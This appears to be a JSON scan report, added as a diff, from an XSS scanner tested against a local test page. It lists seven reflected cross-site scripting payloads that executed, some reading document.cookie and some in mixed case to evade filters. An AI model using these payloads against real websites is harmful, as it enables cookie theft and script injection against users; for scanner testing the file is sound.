@@ -1,0 +1,145 @@
+{
+  "meta": {
+    "scanId": "ed4cf6b0-78b0-40cf-b083-8b72306e4103",
+    "target": "http://localhost:9090/reflected/body?q=test",
+    "status": "REPORTING",
+    "createdAt": "2026-03-02T02:30:50.756Z",
+    "completedAt": null,
+    "options": {
+      "depth": 3,
+      "maxParams": 100,
+      "verifyExecution": true,
+      "wafBypass": true,
+      "maxPayloadsPerParam": 50,
+      "timeout": 60000,
+      "reportFormat": [
+        "html",
+        "json",
+        "pdf"
+      ]
+    },
+    "generatedAt": "2026-03-02T02:31:09.125Z",
+    "version": "0.1.0"
+  },
+  "summary": {
+    "totalVulns": 7,
+    "critical": 0,
+    "high": 5,
+    "medium": 2,
+    "low": 0
+  },
+  "vulnerabilities": [
+    {
+      "id": "78e6fd2e-3275-44fe-95d3-2e313fe8eb21",
+      "param": "q",
+      "payload": "<SvG oNX=() oNLOAd=(conFirM)(doCumEnt.COOKiE)>",
+      "type": "reflected_xss",
+      "severity": "MEDIUM",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": false
+      },
+      "discoveredAt": "2026-03-02T02:31:09.125Z"
+    },
+    {
+      "id": "65856079-2579-43c2-b080-c68b122e15d7",
+      "param": "q",
+      "payload": "<svg onx=() onload=(confirm)(document.cookie)>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:31:09.125Z"
+    },
+    {
+      "id": "da9df5eb-fc3a-4a34-90d5-446b26b1d53c",
+      "param": "q",
+      "payload": "\"><video src=x onerror=javascript:alert(`A`)>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:31:09.125Z"
+    },
+    {
+      "id": "f12b409f-ee69-424b-a617-2ed605a8fcb6",
+      "param": "q",
+      "payload": "\"><img src=x onerror=javascript:alert(`A`)>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:31:09.125Z"
+    },
+    {
+      "id": "b77631eb-4555-477b-84a8-c54d90ff9e7c",
+      "param": "q",
+      "payload": "<shadow onfocus=alert(document.cookie) autofocus tabindex=1>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:31:09.125Z"
+    },
+    {
+      "id": "1bda9494-524c-46da-b472-b8b71e3846c9",
+      "param": "q",
+      "payload": "<Img/srC/onERror=alErT(1)",
+      "type": "reflected_xss",
+      "severity": "MEDIUM",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": false
+      },
+      "discoveredAt": "2026-03-02T02:31:09.125Z"
+    },
+    {
+      "id": "04e37dac-90e5-46d3-af02-f6ef4adfbd17",
+      "param": "q",
+      "payload": "<audio onfocus=alert(1) autofocus tabindex=1>",
+      "type": "reflected_xss",
+      "severity": "HIGH",
+      "url": "http://localhost:9090/reflected/body?q=test",
+      "reflected": true,
+      "executed": true,
+      "evidence": {
+        "responseCode": 200,
+        "reflectionPosition": "attribute",
+        "browserAlertTriggered": true
+      },
+      "discoveredAt": "2026-03-02T02:31:09.125Z"
+    }
+  ]
+}
